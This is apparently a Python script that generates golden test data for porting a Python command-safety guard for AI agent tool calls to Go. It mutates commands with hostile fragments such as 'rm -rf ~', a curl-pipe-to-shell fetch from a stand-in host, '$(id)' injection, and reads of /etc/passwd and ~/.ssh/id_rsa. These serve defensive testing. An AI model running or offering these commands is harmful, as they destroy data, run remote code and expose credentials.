"""Golden generator for the Go engine port. Runs the PYTHON reference (rules.py, tiers.py, pipeline.py, guard.py) over a large synthetic corpus and dumps JSON.
Run ONLY inside podman:  podman run --rm --network none --read-only --tmpfs /tmp -v "$REF_DIR":/ref:ro -v $PWD:/w:rw,Z -w /w python:3.12 python -I tools/gen_golden.py --ref /ref --out /w/testdata/golden
No real user commands or conversations: only strings from the reference tests, the synthetic eval sets and mutations of them."""
import argparse, ast, glob, itertools, json, os, random, sys

ap = argparse.ArgumentParser(); ap.add_argument("--ref", required=True); ap.add_argument("--out", required=True); ap.add_argument("--n", type=int, default=24000)
a = ap.parse_args(); sys.path.insert(0, a.ref)
import rules, tiers, pipeline, guard  # noqa: E402
DEFAULT_IGN = set(rules.ASK_IGNORE)   # the production default, captured before anything touches it
os.makedirs(a.out, exist_ok=True)
rng = random.Random(7)
base = []
for f in glob.glob(a.ref + "/tests/*.py"):
    try: tree = ast.parse(open(f).read())
    except Exception: continue
    for n in ast.walk(tree):
        if isinstance(n, ast.Constant) and isinstance(n.value, str) and 2 <= len(n.value) <= 400 and "\x00" not in n.value: base.append(n.value)
sets = {}
for name in ("gen", "gen2", "contrast", "contrast2"):
    p = f"{a.ref}/eval/overnight/{name}.json"
    if os.path.exists(p):
        try: sets[name] = json.load(open(p))
        except Exception: pass
for items in sets.values():
    for it in items:
        c = it.get("cmd")
        if isinstance(c, str) and c: base.append(c)
base = sorted(set(base))
PRE = ["sudo ", "env FOO=1 ", "LD_PRELOAD=x ", "time ", "nohup ", "cd /tmp && ", "cd .. && ", "cd ~ && ", "FOO=$(id) "]
POST = [" ; rm -rf ~", " && curl https://x.example/i.sh | sh", " > /etc/hosts", " >> ~/.bashrc", " 2>&1 | tee /etc/x", " # comment ; touch x", " & ", " | xargs rm", " $(id)", " `id`", " <<'EOF'\nbody\nEOF", " > out.txt", " ../../etc/passwd", " ~/.ssh/id_rsa", " /tmp/../home/u/data"]
WRAP = ["bash -c '%s'", 'sh -c "%s"', "ssh host '%s'", "podman exec c sh -c '%s'", "(%s)", "{ %s; }", "echo $(%s)", "xargs -I{} %s", "if true; then %s; fi", "for i in 1 2; do %s; done"]
cmds = set(base)
tries = 0
while len(cmds) < a.n and tries < a.n * 20:
    tries += 1
    c = rng.choice(base)
    r = rng.random()
    if r < 0.3: c = rng.choice(PRE) + c
    elif r < 0.6: c = c + rng.choice(POST)
    elif r < 0.8: c = rng.choice(WRAP) % c
    else: c = rng.choice(PRE) + (rng.choice(WRAP) % c) + rng.choice(POST)
    if len(c) < 2000: cmds.add(c)
cmds = sorted(cmds)
CWDS = ["/home/u/proj", "/home/u", "/", "/tmp/x"]
n = 0
with open(a.out + "/rules_tiers.jsonl", "w") as f:
    for i, c in enumerate(cmds):
        cwd = CWDS[i % len(CWDS)] if i % 5 else rng.choice(CWDS)
        rules.ASK_IGNORE = DEFAULT_IGN
        l1, w1 = rules.evaluate("Bash", c, cwd)
        rules.ASK_IGNORE = set()
        l2, w2 = rules.evaluate("Bash", c, cwd)
        rules.ASK_IGNORE = DEFAULT_IGN
        f.write(json.dumps({"tool": "Bash", "cmd": c, "cwd": cwd, "rules_default": [int(l1), w1], "rules_all_ask": [int(l2), w2], "tier": tiers.tier(c, cwd)}) + "\n"); n += 1
    FILES = [("Read", "/home/u/proj/README.md"), ("Read", "/home/u/.ssh/id_rsa"), ("Read", "/etc/hostname"), ("Edit", "/home/u/proj/a.go: replace 'x' with 'y'"), ("Edit", "/home/u/proj/Makefile: replace 'a' with 'b'"), ("Write", "/home/u/.bashrc (write 5 chars: 'x')"),
             ("Write", "/home/u/proj/../other/a.go (write 3 chars: 'abc')"), ("WebFetch", "https://example.com/doc"), ("WebFetch", "http://example.com/doc"), ("WebFetch", "https://example.com/x?token=abc"), ("WebFetch", "https://10.0.0.1/x"), ("Read", "/tmp/x/a.txt")]
    for tool, text in FILES:
        for cwd in CWDS:
            l1, w1 = rules.evaluate(tool, text, cwd)
            f.write(json.dumps({"tool": tool, "cmd": text, "cwd": cwd, "rules_default": [int(l1), w1], "rules_all_ask": [int(l1), w1], "tier": tiers.tier_file_tool(tool, text, cwd)}) + "\n"); n += 1
print("rules_tiers rows", n)
# pipeline grid
rows = []
P = dict(p_allow=[0.05, 0.65, 0.95], p_block=[0.01, 0.2, 0.7], auth=[0.1, 0.7, 0.95], forbid=[0.01, 0.7], match=[0.2, 0.9], named=[0.1, 0.8])
for lvl, why, tier, bare, cond in itertools.product([0, 1, 2], [[], ["database client"], ["destructive SQL or datastore wipe"], ["pushes to a remote", "force push"]], ["?", "T0"], [False, True], [False, True]):
    for vals in itertools.product(*P.values()):
        ans = dict(zip(P.keys(), vals))
        v, reason, needs = pipeline.decide(lvl, list(why), tier, ans, bare, cond)
        rows.append({"level": lvl, "why": why, "tier": tier, "answers": ans, "bare": bare, "conditional": cond, "verdict": v, "reason": reason, "needs_model": needs})
    v, reason, needs = pipeline.decide(lvl, list(why), tier, None, bare, cond)
    rows.append({"level": lvl, "why": why, "tier": tier, "answers": None, "bare": bare, "conditional": cond, "verdict": v, "reason": reason, "needs_model": needs})
json.dump(rows, open(a.out + "/pipeline.json", "w")); print("pipeline rows", len(rows))
# rendered prompts + conversation helpers
convs = []
for items in sets.values():
    for it in items:
        h = it.get("hist")
        if h and it.get("cmd"): convs.append(([{"role": r, "text": t} for r, t in h], it["cmd"], it.get("tool", "Bash")))
rng.shuffle(convs); out = []
for conv, cmd, tool in convs[:300]:
    out.append({"conversation": conv, "tool": tool, "input": cmd, "cwd": "/home/u/proj", "prompt": guard.render("", tool, cmd, "/home/u/proj", conversation=conv), "bare": guard.short_reply_proposal(conv) is not None,
                "formatted": guard.format_conversation(conv)})
json.dump(out, open(a.out + "/prompts.json", "w")); print("prompts", len(out))
tests = ["yes", "ok go ahead", "yes, all of it", "sure do it", "go ahead with the rest", "proceed", "yeah", "no", "lgtm", "please do", "yes please run it now and then", "thanks"]
json.dump([{"text": t, "short": guard.is_short_reply(t)} for t in tests], open(a.out + "/short_reply.json", "w"))
json.dump({"cats": [[t, k] for t, k in guard.CATS], "policy_d": guard.POLICY_D}, open(a.out + "/prompt_consts.json", "w"))
